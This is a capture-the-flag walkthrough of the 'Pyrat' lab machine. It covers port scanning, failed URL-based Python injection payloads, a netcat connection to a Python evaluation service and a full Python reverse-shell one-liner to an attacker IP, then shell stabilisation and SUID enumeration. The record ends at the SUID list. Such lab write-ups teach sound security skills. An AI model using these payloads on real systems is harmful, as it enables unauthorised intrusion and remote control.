# Pyrat

Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.


## Questions: 

* What is the user flag? (hint: "Only manual enumeration will help, do not waste
  fuzzing time.")
* What is the root flag? (hint: "Keep playing with the custom app.")


## Step 1: Initial Enumeration

* Port Scanning (Nmap): Start by scanning the target machine for open ports and services.
  Run an Nmap scan to identify which services are running:

```
nmap -sC -sV -oN nmap_scan.txt 10.10.10.251
```
* -sC: Runs default scripts.
* -sV: Version detection.
* -oN: Saves the output in a file.

Look for any HTTP servers or other services, since the challenge is web-based and mentions a Python vulnerability. If port 80 or 443 (HTTP/HTTPS) is open, proceed to the next step.

Here are the resulsts:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-08 16:35 CDT
Nmap scan report for 10.10.10.251
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
53/tcp   filtered domain
8000/tcp open     http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop:
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions:
|     invalid syntax (<string>, line 1)
|   GetRequest:
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest:
|     name 'OPTIONS' is not defined
|   Help:
|_    name 'HELP' is not defined
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.95%I=7%D=10/8%Time=6705A5AA%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20defin
SF:ed\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain\x20
SF:null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<strin
SF:g>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20cannot\
SF:x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'\x20
SF:is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\x20n
SF:ot\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20string\x
SF:20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"sour
SF:ce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Help,1
SF:B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"invalid\x
SF:20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid\x20
SF:syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x20cod
SF:e\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D,"so
SF:urce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Java
SF:RMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\
SF:n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20
SF:bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\x20n
SF:ull\x20bytes\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.84 seconds
```


**Findings:**

### SSH (Port 22):
* OpenSSH 8.2p1 on Ubuntu is running. While this could be useful later (e.g., for an SSH login), you’ll need credentials or a private key to access this service.
### HTTP on Port 8000:
* A Python SimpleHTTP/0.6 server is running, which is likely the custom web app mentioned in the challenge.
* The fingerprint suggests that certain HTTP methods (GET, OPTIONS, HELP, etc.) may result in errors, which could be exploitable.
* The app is built with Python 3.11.2, indicating that the vulnerability might be related to Python code execution or injection.


**Next Steps:**

### Step 1: Investigate the Web Application on Port 8000

* Access the web application by navigating to http://<Target_IP>:8000 in a browser.
* The server likely doesn't have a title, but that's okay. Explore the web pages, forms, and any links manually.
* Inspect the source code of the webpage (right-click -> "View Page Source"). Sometimes hidden paths, comments, or useful clues can be found here.

### Step 2: Look for Vulnerabilities in the Python SimpleHTTP Server

* Since Python is involved, test for Python code injection possibilities. You can try interacting with any inputs or URL parameters.


## Investigate the Web Application


![](assets/2024-10-09-10-02-53.png)

Source code didn't contain anything :/

The message "try a more basic connection" likely indicates that the web server expects a simpler or different type of interaction, potentially via a lower-level protocol or a specific URL endpoint. Since the service is running on Python's SimpleHTTP server, the response might suggest that it's not fully configured for handling complex browser-based requests and might instead be expecting a simpler interaction, such as with basic HTTP requests or a custom protocol.

**Next Steps:**

### Step 1: Try a Basic Connection with curl

* Since the webpage is suggesting a "basic connection," use curl to manually interact with the HTTP service, as it might respond differently than a browser. Try making simple GET requests to the server without expecting a fancy front-end.

```
curl http://10.10.62.82:8000
```

Some more options
```
curl http://10.10.10.251:8000/index.html
curl http://10.10.10.251:8000/admin
curl http://10.10.10.251:8000/login
```
It returns the same response as the webpage did earlier :/


### Step 2: Check for Directory Listings

* Since the SimpleHTTP server often defaults to allowing directory listings if no index page is configured, you might be able to view the contents of certain directories. Use curl to manually explore common directories:

```
curl http://10.10.10.251:8000/files
curl http://10.10.10.251:8000/admin
curl http://10.10.10.251:8000/static
```

It returns the same response as the webpage did earlier :/


### Step 3: Test for Python Code Injection via URL

* Since this is a Python-based server, there might be an opportunity to inject Python code via the URL, especially if input is being improperly sanitized. Test with simple payloads like:

```
curl http://10.10.10.251:8000/?cmd=__import__('os').system('id')
```
or
```
curl http://10.10.10.251:8000/?test=__import__('os').system('whoami')
```

Observe the responses. If you get a command execution or an error that gives more insight into the server's internal workings, you can craft further payloads.

Didn't work either :/

### Step 4: Look for Special HTTP Methods

* SimpleHTTP servers can sometimes respond differently to specific HTTP methods (such as GET, POST, HEAD, OPTIONS, etc.). You can test this using curl:

Test with a HEAD request:

```
curl -I http://10.10.10.251:8000
```
which returns the following response:
```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: Wed Oct 09 22:38:34  2024
Content-type: text/html; charset=utf-8
Content-Length: 27
```

Or an OPTIONS request:
```
curl -X OPTIONS http://10.10.10.251:8000
```
which also returns the same "try a more basic connection"

The response to your HEAD request indicates that the server is functioning, but no significant leads from this particular interaction. However, the fact that you received a 200 OK response with a small content length (27 bytes) suggests that there might be something more basic or hidden on this server. Since the message said to "try a more basic connection," let's explore further.

## Broken Protocols and HTTP Errors:


### Step 1: Leverage the Error Responses

If the server is returning errors for certain requests, we might be able to trigger detailed error messages that reveal sensitive information (like paths, functions, or even credentials).

From the Nmap scan, we saw responses such as:

* "name 'GET' is not defined"
* "invalid syntax (<string>, line 1)"

These errors suggest that the server is trying to process malformed or unexpected requests, and it's giving us valuable insight into how the server works. Invalid syntax errors may occur when code execution is being attempted but the input is slightly off.

Let’s dig deeper into error-triggering HTTP requests.

You can issue requests with common HTTP methods like GET, POST, OPTIONS, PUT, and DELETE to test how the server handles these and to potentially generate errors that give more information.

Run the following to generate various types of requests:

```
curl -X OPTIONS http://10.10.10.251:8000
curl -X PUT http://10.10.10.251:8000
curl -X DELETE http://10.10.10.251:8000
curl -X POST http://10.10.10.251:8000 -d "testdata=test"
```

If the server is vulnerable or misconfigured, these requests might return different errors, providing hints about the code execution or revealing useful endpoints.

But this didn't work either because I got the same response! Stuck?


## netcat

Netcat (nc) could definitely be the "basic connection" that the webpage hint referred to! Netcat is a powerful tool often used to set up basic connections and transfer data.

Use Netcat to Connect to Port 8000: Simply try using Netcat to establish a connection to the target's port:
```
nc 10.10.10.251 8000
```

Okay, so we're able to connect via netcat and run basic python commands :)

![](assets/2024-10-09-18-11-20.png)

I tried a few other things and it turned out that we are in the root directory
:)

```
import os
print(os.getcwd())

/root (the answer)
```

If you have confirmed that you can execute Python code, setting up a reverse shell is a good next step. This will provide you with a more interactive shell environment, allowing you to run commands as if you were logged into the system.
Steps to Set Up a Python Reverse Shell:

Prepare Your Listener: First, set up a listener on your local machine using Netcat. Open a terminal and run:

```
nc -lvnp 4444
```

Run the Python Reverse Shell Command: Use the following Python code to establish a reverse shell back to your machine. Replace <YOUR_IP> with your actual IP address where your listener is running:

```
import socket, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.21.44.172", 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.system('/bin/sh')
```

Execute the Reverse Shell Code: Run the above code in your current Python environment. This will initiate a connection to your Netcat listener.

## Reverse Shell

Bingo, we got shell connection! By the way, always make sure you look at the ip
and make sure you got it typed down right. The amount of time this could have
saved me! Before doing any of the next steps, stabilize your shell! 

Here is how to do it based on the following [webpage]: (https://www.inkyvoxel.com/how-to-stabilise-netcat-shells-using-python/)

* Check if Python is installed. You can do this by running python --version. You may need to use python, python2, or python3 depending on how the system is set up.

* Inside the remote shell, run python -c 'import pty; pty.spawn("/bin/bash")'. This spawns a more feature-rich Bash shell.

* Run export TERM=xterm to set the xterm terminal emulator.

* Press Ctrl + Z to 'background' the netcat shell. This will return you to the terminal on the attacking computer.

* Run stty raw -echo. This does two things: raw changes how your keyboard input is processed, allowing Ctrl + C, cursor key movements, TAB, autocomplete, etc. to be passed through to the netcat shell; and -echo disables the echo in your terminal as you type, making the netcat shell behave more like a normal terminal.

* Run fg to return the netcat shell to the 'foreground'.

And that's that!

Now let's see what we have on our system!

## Privesc

### 1. Check Sudo Privileges

First, check if the www-data user has any sudo privileges that allow you to execute commands as root:

```
sudo -l
```

If you see entries like NOPASSWD, it means you can run specific commands without being prompted for a password, which could lead to privilege escalation.

In our case, we don't have the sudo privileges :(

### 3. Search for Setuid Binaries

As previously mentioned, look for binaries with setuid permissions:

```
find / -perm -4000 2>/dev/null
```

If you find any binaries, check if they can be exploited. For example, some binaries can be used to escalate privileges if misconfigured.

Here is what we found:
```
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```













